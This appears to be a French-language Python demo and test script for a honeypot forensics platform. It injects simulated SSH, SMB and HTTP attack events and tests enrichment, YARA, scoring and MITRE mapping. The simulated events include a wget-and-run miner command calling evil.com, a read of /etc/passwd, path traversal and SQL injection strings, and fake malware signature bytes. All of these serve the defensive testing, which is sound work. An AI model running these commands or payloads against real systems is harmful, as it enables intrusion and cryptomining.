#!/usr/bin/env python3
"""
ForenHive — Script de démonstration complète
=============================================
Ce script :
  1. Nettoie les anciennes données de test
  2. Injecte des sessions simulées (IPs privées + publiques) pour les 3 honeypots
  3. Teste TOUS les composants du système
  4. Affiche les résultats détaillés de chaque étape

Lancement :
  docker exec forenhive-forensic-engine python3 /app/demo_complet.py
"""

import hashlib
import json
import os
import sys
import tempfile
import time
from datetime import datetime, timezone, timedelta
from pathlib import Path

# Ajouter le répertoire parent au path Python
sys.path.insert(0, str(Path(__file__).parent))
import config

# ── Couleurs terminal ──────────────────────────────────────────────────────────
VERT    = "\033[92m"
ROUGE   = "\033[91m"
JAUNE   = "\033[93m"
CYAN    = "\033[96m"
GRAS    = "\033[1m"
RESET   = "\033[0m"

PASS = f"{VERT}[PASS]{RESET}"
FAIL = f"{ROUGE}[FAIL]{RESET}"
INFO = f"{CYAN}[INFO]{RESET}"
WARN = f"{JAUNE}[WARN]{RESET}"

# ── Compteur global ────────────────────────────────────────────────────────────
resultats = []

def verif(nom, ok, detail=""):
    """Affiche PASS ou FAIL avec le détail."""
    status = PASS if ok else FAIL
    msg = f"{status} {nom}"
    if detail:
        msg += f"  →  {detail}"
    print(msg)
    resultats.append((nom, ok))

def section(titre):
    """Affiche un titre de section."""
    print(f"\n{GRAS}{CYAN}{'═'*62}{RESET}")
    print(f"{GRAS}{CYAN}  {titre}{RESET}")
    print(f"{GRAS}{CYAN}{'═'*62}{RESET}")

def info(msg):
    print(f"  {INFO} {msg}")

# ══════════════════════════════════════════════════════════════════════════════
# DONNÉES DE TEST — IPs privées + publiques pour les 3 honeypots
# ══════════════════════════════════════════════════════════════════════════════

MAINTENANT = datetime.now(timezone.utc)
INDEX_TEST  = f"honeypot-logs-{MAINTENANT.strftime('%Y.%m.%d')}"
TAG_TEST    = "demo-forenhive-test"   # tag pour retrouver et supprimer ces docs

# IPs de test
IP_PRIVE_COWRIE  = "192.168.1.50"   # attaque interne SSH
IP_PRIVE_DIONAEA = "10.0.0.15"      # attaque interne SMB
IP_PRIVE_GALAH   = "172.16.0.5"     # attaque interne HTTP
IP_PUBLIC_TOR    = "185.220.101.45" # nœud Tor connu (AbuseIPDB élevé)
IP_PUBLIC_CHINA  = "222.186.42.213" # Chine — EternalBlue
IP_PUBLIC_GALAH  = "45.95.147.236"  # path traversal HTTP

TS = lambda offset_s=0: (MAINTENANT + timedelta(seconds=offset_s)).strftime("%Y-%m-%dT%H:%M:%S.000Z")

EVENEMENTS = [
    # ── Cowrie SSH — IP privée (menace interne) ────────────────────────────────
    {"@timestamp": TS(0),   "honeypot": {"type": "cowrie"}, "source": {"ip": IP_PRIVE_COWRIE},
     "event": {"id": "cowrie.login.failed"}, "session": {"id": "demo-priv-cowrie-001"},
     "user": {"name": "root", "password": "toor"}, "destination": {"port": "22"},
     TAG_TEST: True},
    {"@timestamp": TS(1),   "honeypot": {"type": "cowrie"}, "source": {"ip": IP_PRIVE_COWRIE},
     "event": {"id": "cowrie.login.failed"}, "session": {"id": "demo-priv-cowrie-001"},
     "user": {"name": "admin", "password": "admin"}, "destination": {"port": "22"},
     TAG_TEST: True},
    {"@timestamp": TS(2),   "honeypot": {"type": "cowrie"}, "source": {"ip": IP_PRIVE_COWRIE},
     "event": {"id": "cowrie.login.success"}, "session": {"id": "demo-priv-cowrie-001"},
     "user": {"name": "root", "password": "123456"}, "destination": {"port": "22"},
     TAG_TEST: True},
    {"@timestamp": TS(3),   "honeypot": {"type": "cowrie"}, "source": {"ip": IP_PRIVE_COWRIE},
     "event": {"id": "cowrie.command.input"}, "session": {"id": "demo-priv-cowrie-001"},
     "process": {"command_line": "cat /etc/passwd"}, "destination": {"port": "22"},
     TAG_TEST: True},

    # ── Cowrie SSH — IP publique Tor (haute menace) ────────────────────────────
    {"@timestamp": TS(10),  "honeypot": {"type": "cowrie"}, "source": {"ip": IP_PUBLIC_TOR},
     "event": {"id": "cowrie.login.failed"}, "session": {"id": "demo-pub-cowrie-tor"},
     "user": {"name": "root", "password": "admin123"}, "destination": {"port": "22"},
     TAG_TEST: True},
    {"@timestamp": TS(11),  "honeypot": {"type": "cowrie"}, "source": {"ip": IP_PUBLIC_TOR},
     "event": {"id": "cowrie.login.failed"}, "session": {"id": "demo-pub-cowrie-tor"},
     "user": {"name": "ubuntu", "password": "ubuntu"}, "destination": {"port": "22"},
     TAG_TEST: True},
    {"@timestamp": TS(12),  "honeypot": {"type": "cowrie"}, "source": {"ip": IP_PUBLIC_TOR},
     "event": {"id": "cowrie.login.success"}, "session": {"id": "demo-pub-cowrie-tor"},
     "user": {"name": "root", "password": "password"}, "destination": {"port": "22"},
     TAG_TEST: True},
    {"@timestamp": TS(13),  "honeypot": {"type": "cowrie"}, "source": {"ip": IP_PUBLIC_TOR},
     "event": {"id": "cowrie.command.input"}, "session": {"id": "demo-pub-cowrie-tor"},
     "process": {"command_line": "wget http://evil.com/miner.sh && chmod +x miner.sh && ./miner.sh"},
     "destination": {"port": "22"}, TAG_TEST: True},
    {"@timestamp": TS(14),  "honeypot": {"type": "cowrie"}, "source": {"ip": IP_PUBLIC_TOR},
     "event": {"id": "cowrie.command.input"}, "session": {"id": "demo-pub-cowrie-tor"},
     "process": {"command_line": "crontab -e"}, "destination": {"port": "22"},
     TAG_TEST: True},

    # ── Dionaea SMB — IP privée (EternalBlue interne) ─────────────────────────
    {"@timestamp": TS(20),  "honeypot": {"type": "dionaea"}, "source": {"ip": IP_PRIVE_DIONAEA},
     "event": {"id": "dionaea.connection"}, "destination": {"port": "445"},
     "message": "SMB from internal host — EternalBlue attempt", TAG_TEST: True},
    {"@timestamp": TS(21),  "honeypot": {"type": "dionaea"}, "source": {"ip": IP_PRIVE_DIONAEA},
     "event": {"id": "dionaea.download"}, "destination": {"port": "445"},
     "file": {"hash": {"sha256": "aabbcc112233"}}, "message": "binary captured",
     TAG_TEST: True},

    # ── Dionaea SMB — IP publique Chine ───────────────────────────────────────
    {"@timestamp": TS(30),  "honeypot": {"type": "dionaea"}, "source": {"ip": IP_PUBLIC_CHINA},
     "event": {"id": "dionaea.connection"}, "destination": {"port": "445"},
     "message": "EternalBlue MS17-010 exploit attempt", TAG_TEST: True},
    {"@timestamp": TS(31),  "honeypot": {"type": "dionaea"}, "source": {"ip": IP_PUBLIC_CHINA},
     "event": {"id": "dionaea.connection"}, "destination": {"port": "3306"},
     "message": "MySQL brute force", TAG_TEST: True},

    # ── Galah HTTP — IP privée (scan interne) ─────────────────────────────────
    {"@timestamp": TS(40),  "honeypot": {"type": "galah"}, "source": {"ip": IP_PRIVE_GALAH},
     "event": {"id": "galah.request"},
     "http": {"request": {"method": "GET", "uri": "/admin"}},
     "message": "admin panel probe from internal network", TAG_TEST: True},

    # ── Galah HTTP — IP publique (path traversal + SQLi) ──────────────────────
    {"@timestamp": TS(50),  "honeypot": {"type": "galah"}, "source": {"ip": IP_PUBLIC_GALAH},
     "event": {"id": "galah.request"},
     "http": {"request": {"method": "GET", "uri": "/../../../etc/passwd"}},
     "message": "path traversal attempt", TAG_TEST: True},
    {"@timestamp": TS(51),  "honeypot": {"type": "galah"}, "source": {"ip": IP_PUBLIC_GALAH},
     "event": {"id": "galah.request"},
     "http": {"request": {"method": "POST", "uri": "/login?user=admin'+OR+'1'='1"}},
     "message": "SQL injection attempt", TAG_TEST: True},
    {"@timestamp": TS(52),  "honeypot": {"type": "galah"}, "source": {"ip": IP_PUBLIC_GALAH},
     "event": {"id": "galah.request"},
     "http": {"request": {"method": "GET", "uri": "/.env"}},
     "message": "env file probe", TAG_TEST: True},
]


# ══════════════════════════════════════════════════════════════════════════════
# 1. NETTOYAGE DES ANCIENNES DONNÉES DE TEST
# ══════════════════════════════════════════════════════════════════════════════

def nettoyer_donnees_test(es):
    """Supprime les anciens documents de test dans Elasticsearch et PostgreSQL."""
    section("NETTOYAGE — Suppression des anciennes données de test")

    # Supprimer dans Elasticsearch
    supprime_es = 0
    try:
        rep = es.delete_by_query(
            index="honeypot-logs-*",
            body={"query": {"exists": {"field": TAG_TEST}}},
            refresh=True,
            ignore_unavailable=True,
        )
        supprime_es = rep.get("deleted", 0)
    except Exception as e:
        info(f"ES delete_by_query : {e}")

    verif("Suppression anciens docs ES", True, f"{supprime_es} documents supprimés")

    # Supprimer les sessions de démo dans PostgreSQL
    supprime_pg = 0
    try:
        import psycopg2
        with psycopg2.connect(
            host=config.PG_HOST, port=config.PG_PORT,
            dbname=config.PG_DB, user=config.PG_USER,
            password=os.environ.get("PG_PASSWORD") or os.environ.get("POSTGRES_PASSWORD", "")
        ) as conn:
            with conn.cursor() as cur:
                cur.execute("DELETE FROM forensic_sessions WHERE session_id LIKE 'demo-%'")
                supprime_pg = cur.rowcount
                cur.execute("DELETE FROM ip_enrichment_cache WHERE ip IN %s",
                            (tuple([IP_PRIVE_COWRIE, IP_PRIVE_DIONAEA, IP_PRIVE_GALAH,
                                    IP_PUBLIC_TOR, IP_PUBLIC_CHINA, IP_PUBLIC_GALAH]),))
            conn.commit()
    except Exception as e:
        info(f"PG cleanup : {e}")

    verif("Suppression anciennes sessions PG", True, f"{supprime_pg} sessions supprimées")


# ══════════════════════════════════════════════════════════════════════════════
# 2. INJECTION DES DONNÉES DE TEST DANS ELASTICSEARCH
# ══════════════════════════════════════════════════════════════════════════════

def injecter_evenements(es):
    """Injecte les événements de test dans l'index Elasticsearch du jour."""
    section("INJECTION — Données de test dans Elasticsearch")

    # Construction du bulk payload
    ops = []
    for doc in EVENEMENTS:
        ops.append({"index": {"_index": INDEX_TEST}})
        ops.append(doc)

    try:
        rep = es.bulk(operations=ops, refresh=True)
        erreurs = [i for i in rep.get("items", []) if "error" in i.get("index", {})]
        ok = len(EVENEMENTS) - len(erreurs)
        verif(f"Injection bulk ES ({len(EVENEMENTS)} docs)", len(erreurs) == 0,
              f"{ok} créés, {len(erreurs)} erreurs")

        # Résumé par honeypot
        cowrie  = sum(1 for d in EVENEMENTS if d.get("honeypot", {}).get("type") == "cowrie")
        dionaea = sum(1 for d in EVENEMENTS if d.get("honeypot", {}).get("type") == "dionaea")
        galah   = sum(1 for d in EVENEMENTS if d.get("honeypot", {}).get("type") == "galah")
        info(f"Cowrie={cowrie} docs | Dionaea={dionaea} docs | Galah={galah} docs")

    except Exception as e:
        verif("Injection bulk ES", False, str(e))
        return False

    return True


# ══════════════════════════════════════════════════════════════════════════════
# 3. TEST ELASTICSEARCH
# ══════════════════════════════════════════════════════════════════════════════

def tester_elasticsearch(es):
    """Vérifie la santé du cluster et les données injectées."""
    section("ELASTICSEARCH — Santé du cluster et données")

    # Santé du cluster
    try:
        sante = es.cluster.health()
        statut = sante["status"]
        verif("Cluster ES en bonne santé", statut in ("green", "yellow"),
              f"status={statut}")
    except Exception as e:
        verif("Cluster ES accessible", False, str(e))
        return

    # Compter les événements injectés par type
    try:
        for honeypot in ("cowrie", "dionaea", "galah"):
            rep = es.count(
                index=INDEX_TEST,
                body={"query": {"bool": {"filter": [
                    {"term":   {"honeypot.type.keyword": honeypot}},
                    {"exists": {"field": TAG_TEST}},
                ]}}}
            )
            n = rep["count"]
            verif(f"  Événements {honeypot} injectés", n > 0, f"{n} docs")
    except Exception as e:
        verif("Comptage par honeypot", False, str(e))

    # Vérifier les IPs source présentes
    try:
        rep = es.search(index=INDEX_TEST, body={
            "size": 0,
            "query": {"exists": {"field": TAG_TEST}},
            "aggs": {"ips": {"terms": {"field": "source.ip.keyword", "size": 20}}}
        })
        ips = [b["key"] for b in rep["aggregations"]["ips"]["buckets"]]
        ips_privees  = [ip for ip in ips if any(ip.startswith(p) for p in ("10.", "192.168.", "172."))]
        ips_publiques = [ip for ip in ips if ip not in ips_privees]
        verif("IPs privées présentes dans ES", len(ips_privees) > 0,
              ", ".join(ips_privees))
        verif("IPs publiques présentes dans ES", len(ips_publiques) > 0,
              ", ".join(ips_publiques))
    except Exception as e:
        verif("Vérification IPs source", False, str(e))

    # Sessions Cowrie détectées
    try:
        rep = es.search(index=INDEX_TEST, body={
            "size": 0,
            "query": {"bool": {"filter": [
                {"term":   {"honeypot.type.keyword": "cowrie"}},
                {"exists": {"field": "session.id"}},
                {"exists": {"field": TAG_TEST}},
            ]}},
            "aggs": {"sessions": {"terms": {"field": "session.id.keyword", "size": 10}}}
        })
        sessions = [b["key"] for b in rep["aggregations"]["sessions"]["buckets"]]
        verif("Sessions Cowrie détectées dans ES", len(sessions) > 0,
              f"{len(sessions)} session(s) : {sessions}")
    except Exception as e:
        verif("Sessions Cowrie dans ES", False, str(e))


# ══════════════════════════════════════════════════════════════════════════════
# 4. TEST FILEBEAT
# ══════════════════════════════════════════════════════════════════════════════

def tester_filebeat():
    """Vérifie que Filebeat collecte bien les logs (preuve indirecte via ES)."""
    section("FILEBEAT — Collecteur de logs")

    # Filebeat n'expose pas de port depuis l'intérieur du conteneur forensic-engine.
    # On vérifie son activité de façon indirecte : s'il tourne, il alimente ES.
    # On contrôle donc que des événements récents existent dans ES pour chaque honeypot.
    try:
        from elasticsearch import Elasticsearch
        es = Elasticsearch(
            [{"host": config.ES_HOST, "port": config.ES_PORT, "scheme": "http"}],
            request_timeout=10
        )

        # Compter le total d'événements dans tous les indices
        rep_total = es.count(index="honeypot-logs-*", body={"query": {"match_all": {}}})
        total = rep_total["count"]
        verif("Filebeat actif — événements présents dans ES", total > 0,
              f"{total:,} événements collectés au total")

        # Vérifier que chaque honeypot a des données (preuve que Filebeat les lit)
        for honeypot in ("cowrie", "dionaea", "galah"):
            rep = es.count(
                index="honeypot-logs-*",
                body={"query": {"term": {"honeypot.type.keyword": honeypot}}}
            )
            n = rep["count"]
            verif(f"  Filebeat → {honeypot} : données reçues", n > 0,
                  f"{n:,} événements")

        # Vérifier l'index le plus récent (Filebeat crée un index par jour)
        rep_indices = es.cat.indices(index="honeypot-logs-*", h="index,docs.count",
                                     s="index:desc", format="json")
        if rep_indices:
            dernier = rep_indices[0]
            verif("  Index journalier le plus récent",
                  int(dernier.get("docs.count", 0)) > 0,
                  f"{dernier['index']}  ({dernier.get('docs.count','?')} docs)")

    except Exception as e:
        verif("Filebeat — vérification indirecte via ES", False, str(e))


# ══════════════════════════════════════════════════════════════════════════════
# 5. TEST POSTGRESQL
# ══════════════════════════════════════════════════════════════════════════════

def tester_postgresql():
    """Vérifie la connexion PostgreSQL et les tables du schéma ForenHive."""
    section("POSTGRESQL — Base de données forensique")

    try:
        import psycopg2, psycopg2.extras
        conn = psycopg2.connect(
            host=config.PG_HOST, port=config.PG_PORT,
            dbname=config.PG_DB, user=config.PG_USER,
            password=os.environ.get("PG_PASSWORD") or os.environ.get("POSTGRES_PASSWORD", "")
        )
        verif("Connexion PostgreSQL", True, f"{config.PG_HOST}:{config.PG_PORT}/{config.PG_DB}")
    except Exception as e:
        verif("Connexion PostgreSQL", False, str(e))
        return

    with conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor) as cur:

        # Vérifier les tables
        for table in ("forensic_sessions", "ip_enrichment_cache", "file_analysis", "suspect_profiles"):
            try:
                cur.execute(f"SELECT COUNT(*) AS n FROM {table}")
                n = cur.fetchone()["n"]
                verif(f"  Table '{table}' existe", True, f"{n} ligne(s)")
            except Exception as e:
                verif(f"  Table '{table}' existe", False, str(e))

        # Afficher les sessions forensiques avec leur score
        try:
            cur.execute("""
                SELECT session_id, source_ip, honeypot_type, risk_score,
                       started_at::text
                FROM forensic_sessions
                ORDER BY risk_score DESC NULLS LAST
                LIMIT 5
            """)
            lignes = cur.fetchall()
            if lignes:
                info("Top 5 sessions par score de risque :")
                for r in lignes:
                    info(f"  {r['session_id'][:20]:<22} ip={r['source_ip']:<18} "
                         f"score={r['risk_score'] or '?':>3}  type={r['honeypot_type']}")
            verif("Sessions forensiques présentes", len(lignes) > 0,
                  f"{len(lignes)} session(s) avec score")
        except Exception as e:
            verif("Lecture forensic_sessions", False, str(e))

        # Cache d'enrichissement IP
        try:
            cur.execute("SELECT COUNT(*) AS n FROM ip_enrichment_cache WHERE expires_at > NOW()")
            n = cur.fetchone()["n"]
            verif("Cache enrichissement IP actif", n >= 0, f"{n} entrée(s) non expirées")
        except Exception as e:
            verif("Cache enrichissement IP", False, str(e))

    conn.close()


# ══════════════════════════════════════════════════════════════════════════════
# 6. TEST ENRICHISSEMENT IP (privée vs publique)
# ══════════════════════════════════════════════════════════════════════════════

def tester_enrichissement():
    """Teste la détection des IPs privées et l'enrichissement des IPs publiques."""
    section("ENRICHISSEMENT IP — Privée vs Publique")

    from enricher import IPEnricher, est_ip_privee

    # Détection IP privée
    for ip_priv in [IP_PRIVE_COWRIE, IP_PRIVE_DIONAEA, IP_PRIVE_GALAH]:
        verif(f"  IP privée détectée : {ip_priv}", est_ip_privee(ip_priv))

    # Détection IP publique
    for ip_pub in [IP_PUBLIC_TOR, IP_PUBLIC_CHINA, IP_PUBLIC_GALAH]:
        verif(f"  IP publique reconnue : {ip_pub}", not est_ip_privee(ip_pub))

    enricher = IPEnricher()

    # Enrichissement IP privée → doit retourner {private: True} sans appel API
    info(f"Enrichissement IP privée {IP_PRIVE_COWRIE} ...")
    debut = time.time()
    res_priv = enricher.enrichir(IP_PRIVE_COWRIE)
    duree = time.time() - debut
    verif("  IP privée → threat_origin=internal", res_priv.get("private") is True,
          f"private={res_priv.get('private')} en {duree:.2f}s")
    info(f"  Note : {res_priv.get('note', '')}")

    # Enrichissement IP publique (Tor exit node)
    info(f"Enrichissement IP publique {IP_PUBLIC_TOR} (Tor exit node) ...")
    debut = time.time()
    res_pub = enricher.enrichir(IP_PUBLIC_TOR)
    duree = time.time() - debut
    verif("  Enrichissement IP publique réussi", "geo" in res_pub or "reputation" in res_pub,
          f"clés={list(res_pub.keys())} en {duree:.1f}s")

    geo = res_pub.get("geo", {})
    if geo:
        info(f"  GeoIP : pays={geo.get('country', '?')} ville={geo.get('city', '?')} "
             f"asn={geo.get('asn', '?')}")
        verif("  GeoIP : pays détecté", bool(geo.get("country")),
              f"country={geo.get('country', 'N/A')}")

    rep = res_pub.get("reputation", {})
    if rep:
        info(f"  AbuseIPDB : score={rep.get('abuse_score', '?')} "
             f"signalements={rep.get('total_reports', '?')}")
        verif("  AbuseIPDB : score obtenu", "abuse_score" in rep,
              f"score={rep.get('abuse_score', 'N/A')}")

    priv = res_pub.get("privacy", {})
    if priv:
        info(f"  Anonymisation : tor={priv.get('is_tor')} vpn={priv.get('is_vpn')} "
             f"proxy={priv.get('is_proxy')}")

    infra = res_pub.get("infrastructure", {})
    if infra:
        info(f"  Shodan : ports={infra.get('open_ports', [])} "
             f"vulns={infra.get('vulns', [])}")

    return res_pub


# ══════════════════════════════════════════════════════════════════════════════
# 7. TEST YARA
# ══════════════════════════════════════════════════════════════════════════════

def tester_yara():
    """Compile les règles YARA et scanne des fichiers synthétiques."""
    section("YARA — Détection de malwares")

    from yara_scanner import YARAScanner

    # Compilation des règles
    scanner = YARAScanner()
    verif("Règles YARA compilées", scanner.rules is not None,
          f"répertoire={scanner.rules_dir}")

    if scanner.rules is None:
        return

    # Lister les fichiers .yar disponibles
    fichiers_yar = list(Path(scanner.rules_dir).glob("*.yar"))
    info(f"Règles disponibles : {[f.name for f in fichiers_yar]}")

    # Créer des fichiers binaires synthétiques et les scanner
    cas_test = [
        ("WannaCry",    b"WNcry@2ol7\x00" + b"WANACRY!" * 5 + b"tasksche.exe"),
        ("XMRig miner", b"stratum+tcp://pool.minexmr.com:4444" + b"xmrig" * 3),
        ("AsyncRAT",    b"AsyncRAT" + b"Pastebin" + b"Install_helper"),
        ("Fichier sain",b"This is a normal text file with no malware signatures."),
    ]

    for nom, contenu in cas_test:
        with tempfile.NamedTemporaryFile(delete=False, suffix=".bin") as tmp:
            tmp.write(contenu)
            chemin = tmp.name
        try:
            correspondances = scanner.scanner_fichier(chemin)
            regles = [m["rule"] for m in correspondances]
            if nom == "Fichier sain":
                verif(f"  YARA '{nom}' → aucune correspondance", len(correspondances) == 0,
                      f"règles={regles or 'aucune'}")
            else:
                verif(f"  YARA '{nom}' détecté", len(correspondances) > 0,
                      f"règles={regles}")
                if correspondances:
                    info(f"    Namespace={correspondances[0]['namespace']} "
                         f"Strings={len(correspondances[0].get('strings', []))}")
        finally:
            os.unlink(chemin)

    # Scanner les binaires Dionaea (si disponibles)
    dossier_dionaea = Path(config.DIONAEA_BINARIES_PATH)
    if dossier_dionaea.exists():
        fichiers = list(dossier_dionaea.iterdir())
        info(f"Scan Dionaea : {len(fichiers)} fichiers dans {dossier_dionaea}")
        resultats_dionaea = scanner.scanner_binaires_dionaea()
        detectes = sum(1 for r in resultats_dionaea if r["matched"])
        verif(f"Scan dossier Dionaea terminé", True,
              f"{detectes}/{len(resultats_dionaea)} fichiers malveillants détectés")
        for r in resultats_dionaea:
            if r["matched"]:
                regles = [m["rule"] for m in r["matches"]]
                info(f"  DÉTECTION {Path(r['filepath']).name[:30]} → {regles}")
    else:
        verif("Scan Dionaea", False,
              f"dossier introuvable : {dossier_dionaea}")


# ══════════════════════════════════════════════════════════════════════════════
# 8. TEST VIRUSTOTAL
# ══════════════════════════════════════════════════════════════════════════════

def tester_virustotal():
    """Teste la lookup VirusTotal sur un hash SHA-256 connu."""
    section("VIRUSTOTAL — Analyse de hashes SHA-256")

    from virustotal import VirusTotalScanner

    vt = VirusTotalScanner()

    if not config.VIRUSTOTAL_KEY:
        verif("Clé VirusTotal configurée", False, "VIRUSTOTAL_KEY non définie")
        return

    verif("Clé VirusTotal configurée", True,
          f"clé={config.VIRUSTOTAL_KEY[:6]}***")

    # Hash EICAR (test antivirus standard)
    HASH_EICAR = "275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"
    info(f"Lookup EICAR : {HASH_EICAR[:16]}...")
    rep = vt.lookup_hash(HASH_EICAR)
    if rep:
        verif("  VirusTotal : réponse reçue", True,
              f"détections={rep.get('malicious', 0)}/{rep.get('total', '?')}")
        info(f"  Nom malware : {rep.get('name', 'N/A')}")
        info(f"  Type : {rep.get('type_description', 'N/A')}")
    else:
        verif("  VirusTotal : lookup EICAR", False, "aucun résultat")


# ══════════════════════════════════════════════════════════════════════════════
# 9. TEST SCORING DES RISQUES
# ══════════════════════════════════════════════════════════════════════════════

def tester_scoring():
    """Vérifie la grille de scoring sur des sessions synthétiques."""
    section("RISK SCORE — Calcul du score 0–100")

    from risk_score import calculer_score_risque, niveau_risque

    # calculer_score_risque attend un dict avec tous les champs aplatis
    # Seuils ajustés à la grille réelle (risk_score.py) :
    #   login_attempts : > 10 → +2 pts, > 100 → +5, > 500 → +10
    #   abuse_score    : score * 0.40  (ex: 100 → +40)
    #   Tor/VPN        : +10 pts
    #   YARA critique  : +20 pts (WannaCry, Mirai, Emotet)
    #   port critique  : +5 pts
    #   exfil > 100Ko  : +2 pts, > 1Mo : +5 pts
    cas = [
        ("Session propre (aucun signal)",
         {"login_attempts": 0, "abuse_score": 0, "is_tor": False},
         0, 0, "INFO"),

        ("Brute-force modéré (50 tentatives)",
         {"login_attempts": 50, "destination_port": 22, "abuse_score": 0},
         0, 10, "INFO"),

        ("IP Tor + AbuseIPDB=100",
         {"login_attempts": 2, "abuse_score": 100, "is_tor": True},
         48, 52, "MEDIUM"),

        ("WannaCry + port critique (445)",
         {"login_attempts": 1, "destination_port": 445,
          "yara_matches": ["WannaCry_Ransomware"], "abuse_score": 0},
         20, 30, None),

        ("Attaque maximale (tout cumulé)",
         {"login_attempts": 600, "destination_port": 445,
          "yara_matches": ["WannaCry_Ransomware", "LockBit_Ransomware"],
          "exfil_bytes": 2_000_000, "abuse_score": 100, "is_tor": True},
         90, 100, "CRITICAL"),
    ]

    for nom, session, score_min, score_max, niveau_attendu in cas:
        score = calculer_score_risque(session)
        niv   = niveau_risque(score)
        ok_score = score_min <= score <= score_max
        ok_niv   = (niveau_attendu is None) or (niv == niveau_attendu)
        verif(f"  {nom}", ok_score and ok_niv,
              f"score={score} niveau={niv}")


# ══════════════════════════════════════════════════════════════════════════════
# 10. TEST OLLAMA / MITRE ATT&CK
# ══════════════════════════════════════════════════════════════════════════════

def tester_ollama():
    """Teste la disponibilité d'Ollama et le mapping MITRE ATT&CK."""
    section("OLLAMA / MITRE ATT&CK — Mapping via Mistral 7B")

    import requests as req

    # Vérifier qu'Ollama répond
    try:
        rep = req.get(f"{config.OLLAMA_URL}/api/tags", timeout=5)
        modeles = [m["name"].split(":")[0] for m in rep.json().get("models", [])]
        verif("Ollama accessible", True,
              f"url={config.OLLAMA_URL}")
        verif(f"Modèle '{config.OLLAMA_MODEL}' chargé", config.OLLAMA_MODEL in modeles,
              f"modèles disponibles : {modeles or 'aucun'}")
        if config.OLLAMA_MODEL not in modeles:
            return
    except Exception as e:
        verif("Ollama accessible", False, str(e))
        return

    from ollama_mitre import OllamaMitreMapper

    mapper = OllamaMitreMapper()

    # Session 1 : brute-force SSH Tor
    info(f"Mapping MITRE — session SSH Tor (peut prendre ~30–60s)...")
    session_ssh = {
        "session_id":       "demo-pub-cowrie-tor",
        "honeypot_type":    "cowrie",
        "source_ip":        IP_PUBLIC_TOR,
        "login_attempts":   5,
        "destination_port": 22,
        "yara_matches":     [],
        "exfil_bytes":      0,
    }
    commandes = ["wget http://evil.com/miner.sh", "chmod +x miner.sh", "./miner.sh", "crontab -e"]
    debut = time.time()
    res = mapper.mapper_session(session_ssh, commandes)
    duree = time.time() - debut

    if res:
        verif("Mapping MITRE SSH réussi", True, f"en {duree:.0f}s")
        info(f"  Phase Kill Chain : {res.get('kill_chain_phase', '?')}")
        info(f"  Tactics  : {res.get('tactics', [])}")
        for t in res.get("techniques", []):
            info(f"  Technique: {t.get('id')} — {t.get('name')}")
        info(f"  Résumé   : {res.get('summary', '(vide)')}")
        verif("  Summary non vide", bool(res.get("summary")),
              res.get("summary", "")[:80])
        verif("  Phase Kill Chain valide", bool(res.get("kill_chain_phase")),
              res.get("kill_chain_phase"))
    else:
        verif("Mapping MITRE SSH", False, "aucun résultat")

    # Session 2 : exploitation SMB (Dionaea)
    info(f"Mapping MITRE — session SMB EternalBlue ...")
    session_smb = {
        "session_id":       "demo-pub-dionaea-china",
        "honeypot_type":    "dionaea",
        "source_ip":        IP_PUBLIC_CHINA,
        "login_attempts":   1,
        "destination_port": 445,
        "yara_matches":     ["WannaCry_Ransomware"],
        "exfil_bytes":      84120,
    }
    debut = time.time()
    res2 = mapper.mapper_session(session_smb)
    duree = time.time() - debut

    if res2:
        verif("Mapping MITRE SMB réussi", True, f"en {duree:.0f}s")
        info(f"  Phase : {res2.get('kill_chain_phase')}  "
             f"Techniques : {len(res2.get('techniques', []))}")
        info(f"  Résumé : {res2.get('summary', '')[:100]}")
    else:
        verif("Mapping MITRE SMB", False, "aucun résultat")

    return res


# ══════════════════════════════════════════════════════════════════════════════
# 11. TEST PIPELINE FORENSIQUE COMPLET (engine.py)
# ══════════════════════════════════════════════════════════════════════════════

def tester_pipeline_complet(es):
    """Lance l'étape de scoring + MITRE sur les sessions injectées."""
    section("PIPELINE FORENSIQUE — Scoring + MITRE sur les sessions injectées")

    # Importer et instancier le moteur
    try:
        from engine import ForensicEngine, recuperer_sessions
        moteur = ForensicEngine()
        verif("ForensicEngine initialisé", True)
    except Exception as e:
        verif("ForensicEngine initialisé", False, str(e))
        return

    # Étape 1 : enrichissement des IPs des sessions injectées
    info("Étape 1 — Enrichissement IP (sessions demo) ...")
    try:
        cache = moteur.etape_enrichissement(heures=1)
        verif("Enrichissement IP terminé", True, f"{len(cache)} IPs traitées")
    except Exception as e:
        verif("Enrichissement IP", False, str(e))
        cache = {}

    # Étape 3 : scoring (1 heure en arrière pour capturer les docs injectés)
    info("Étape 3 — Scoring des sessions Cowrie ...")
    try:
        sessions_scorees = moteur.etape_scoring(heures=1, cache_enrichissement=cache)
        verif("Scoring des sessions", True,
              f"{len(sessions_scorees)} session(s) scorée(s)")
        for sid, ip, score, niveau in sessions_scorees:
            niv_couleur = {
                "CRITICAL": ROUGE,
                "HIGH":     ROUGE,
                "MEDIUM":   JAUNE,
                "LOW":      VERT,
                "INFO":     CYAN,
            }.get(niveau, RESET)
            info(f"  {sid[:20]:<22} ip={ip:<18} "
                 f"score={score:>3}  niveau={niv_couleur}{niveau}{RESET}")
    except Exception as e:
        verif("Scoring des sessions", False, str(e))

    # Vérifier dans PostgreSQL que les sessions ont été sauvegardées
    try:
        import psycopg2, psycopg2.extras
        with psycopg2.connect(
            host=config.PG_HOST, port=config.PG_PORT,
            dbname=config.PG_DB, user=config.PG_USER,
            password=os.environ.get("PG_PASSWORD") or os.environ.get("POSTGRES_PASSWORD", "")
        ) as conn:
            with conn.cursor(cursor_factory=psycopg2.extras.RealDictCursor) as cur:
                cur.execute("""
                    SELECT session_id, source_ip, risk_score,
                           (mitre_techniques->>'kill_chain_phase') AS phase
                    FROM forensic_sessions
                    WHERE session_id LIKE 'demo-%'
                    ORDER BY risk_score DESC NULLS LAST
                """)
                lignes = cur.fetchall()
        verif("Sessions demo sauvegardées dans PostgreSQL", len(lignes) > 0,
              f"{len(lignes)} session(s)")
        for r in lignes:
            info(f"  {r['session_id'][:22]:<24} score={r['risk_score'] or '?':>3} "
                 f"phase={r['phase'] or 'N/A'}")
    except Exception as e:
        verif("Sauvegarde PostgreSQL", False, str(e))


# ══════════════════════════════════════════════════════════════════════════════
# POINT D'ENTRÉE
# ══════════════════════════════════════════════════════════════════════════════

def main():
    print(f"\n{GRAS}{'━'*62}{RESET}")
    print(f"{GRAS}  ForenHive — Démonstration Complète{RESET}")
    print(f"{GRAS}  Honeypots + ETL + Forensic Engine{RESET}")
    print(f"{GRAS}{'━'*62}{RESET}")
    print(f"  Date  : {MAINTENANT.strftime('%Y-%m-%d %H:%M:%S')} UTC")
